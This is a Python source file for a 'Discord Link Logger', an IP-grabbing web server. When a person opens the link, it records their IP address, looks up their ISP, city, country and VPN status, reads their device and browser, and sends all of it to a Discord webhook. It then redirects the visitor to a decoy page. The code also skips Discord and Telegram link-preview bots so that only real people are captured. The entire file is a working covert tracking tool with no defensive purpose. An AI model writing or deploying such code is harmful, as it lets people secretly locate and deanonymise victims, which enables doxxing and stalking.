from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, httpagentparser, json, socket

__app__ = "Discord Link Logger"
__description__ = "A link logger that redirects to a specified page"
__version__ = "v2.1"
__author__ = ""

config = {
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE",
    "username": "Link Logger",
    "color": 0x000000,
    "redirect": {
        "enabled": True,
        "page": "https://snare-delta.vercel.app/"
    },
    "vpnCheck": 1,
    "antiBot": 1,
    "linkAlerts": True
}

blacklistedIPs = ("27", "104", "143", "164")

def get_client_ip(request):
    """Get client IP from various headers"""
    ip = request.headers.get('x-forwarded-for', '').split(',')[0] or \
          request.headers.get('x-real-ip', '') or \
          request.client_address[0]
    return ip.strip() if ip else 'Unknown'

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "embeds": [{
                "title": "Logger Error",
                "color": config["color"],
                "description": f"```\n{error}\n```"
            }]
        }, timeout=5)
    except Exception as e:
        print(f"Failed to send error report: {e}")

def get_discord_info(request):
    try:
        cf_ray = request.headers.get('CF-RAY', '').lower()
        if 'discord' in cf_ray:
            return {
                "is_discord": True,
                "user_agent": request.headers.get('User-Agent', 'Unknown'),
                "referer": request.headers.get('Referer', 'Unknown')
            }
        return {"is_discord": False}
    except:
        return {"is_discord": False}

def makeReport(ip, useragent=None, discord_info=None):
    if not ip or ip == 'Unknown' or ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent or '')
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Bot Detected",
                        "color": config["color"],
                        "description": f"Bot activity detected\n\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                    }]
                }, timeout=5)
            except Exception as e:
                reportError(f"Bot report failed: {str(e)}")
        return

    try:
        # Get IP information with timeout
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
        
        embed = {
            "username": config["username"],
            "embeds": [{
                "title": "Link Accessed",
                "color": config["color"],
                "description": "",
                "fields": []
            }]
        }

        # Add IP information
        fields = [
            {"name": "IP Address", "value": f"`{ip}`", "inline": True},
            {"name": "ISP", "value": f"`{info.get('isp', 'Unknown')}`", "inline": True},
            {"name": "Location", "value": f"`{info.get('city', 'Unknown')}, {info.get('country', 'Unknown')}`", "inline": True},
            {"name": "VPN/Proxy", "value": f"`{'Yes' if info.get('proxy') else 'No'}`", "inline": True}
        ]

        if useragent:
            try:
                device, browser = httpagentparser.simple_detect(useragent)
                fields.extend([
                    {"name": "Device", "value": f"`{device}`", "inline": True},
                    {"name": "Browser", "value": f"`{browser}`", "inline": True}
                ])
            except:
                fields.append({"name": "User Agent", "value": f"`{useragent}`", "inline": False})

        embed["embeds"][0]["fields"] = fields

        if discord_info and discord_info.get("is_discord"):
            embed["embeds"][0]["description"] = "**Accessed from Discord**"
            embed["embeds"][0]["fields"].append(
                {"name": "User Agent", "value": f"```\n{discord_info.get('user_agent', 'Unknown')}\n```", "inline": False}
            )
        else:
            embed["embeds"][0]["description"] = "**Link Accessed**"

        # Send to Discord with timeout
        requests.post(config["webhook"], json=embed, timeout=10)
        return info

    except Exception as e:
        reportError(f"Report generation failed: {str(e)}\n\nIP: {ip}\nUser Agent: {useragent}")

class LinkLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            ip = get_client_ip(self)
            useragent = self.headers.get('User-Agent', '')
            discord_info = get_discord_info(self)
            
            makeReport(ip, useragent, discord_info)
            
            if config["redirect"]["enabled"]:
                self.send_response(302)
                self.send_header('Location', config["redirect"]["page"])
                self.end_headers()
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'Link logged successfully')

        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

def run_server():
    port = 8080
    server_address = ('', port)
    httpd = HTTPServer(server_address, LinkLoggerAPI)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
